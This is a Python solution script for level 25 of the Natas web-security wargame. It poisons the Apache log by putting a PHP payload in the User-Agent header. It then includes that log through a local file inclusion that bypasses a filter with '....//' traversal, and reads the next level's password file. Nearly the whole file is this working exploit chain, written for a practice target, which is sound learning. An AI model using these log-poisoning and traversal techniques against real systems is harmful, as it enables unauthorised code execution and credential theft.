import re
from src.natas.base_level import NatasLevel

class Level_25(NatasLevel):

  num = 25
  explanation = "On this level, Apache logs the User-Agent header for every request. We inject PHP code\n     into the log via the User-Agent, then use an LFI (bypassing the filter with `....//`) to\n     include that log file, causing the server to execute the injected code and leak the password."

  def exploit(self) -> str:

    PAYLOAD = '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
    self.session.get(self.base_url + "/index.php?lang=....//etc/passwd", headers = {"User-Agent": PAYLOAD})
    COOKIE  = self.session.cookies.get("PHPSESSID")
    resp    = self.session.get(self.base_url + f"/index.php?lang=....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{COOKIE}.log", headers = {'Cookie': f"PHPSESSID={COOKIE}"})
    matches = re.findall(r'[a-zA-Z0-9]{32}', resp.text)
    match = matches[-1]

    return match
